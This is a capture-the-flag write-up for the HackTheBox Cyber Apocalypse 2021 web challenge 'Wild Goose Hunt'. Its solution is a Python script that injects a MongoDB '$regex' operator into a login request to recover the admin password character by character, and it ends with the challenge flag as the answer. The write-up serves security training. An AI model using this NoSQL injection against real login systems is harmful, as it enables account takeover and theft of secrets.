---
name: Wild Goose Hunt (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Web
description: Writeup for Wild Goose Hunt (Web) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Wild Goose Hunt

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/vqR4i730soY/0.jpg)](https://youtu.be/vqR4i730soY?t=1680s "HTB Cyber Apocalypse CTF 2021: Wild Goose Hunt")

## Challenge Description

> Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?

## Solution

{% code overflow="wrap" %}
```py
import requests
import string

flag = "CHTB{"
url = "http://127.0.0.1:1337/api/login"

# Each time a successful login is seen, restart loop
restart = True

while restart:
    restart = False
    # Characters like *, ., &, and + has to be avoided because we use regex
    for i in "_" + string.ascii_lowercase + string.digits + "!#$%^()@{}":
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)
        # Correct char results in "successful password"
        if 'Successful' in r.text:
            print(payload)
            restart = True
            flag = payload
            # Exit if "}" gives a valid redirect
            if i == "}":
                print("\nFlag: " + flag)
                exit(0)
            break
```
{% endcode %}

Flag: `CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}`
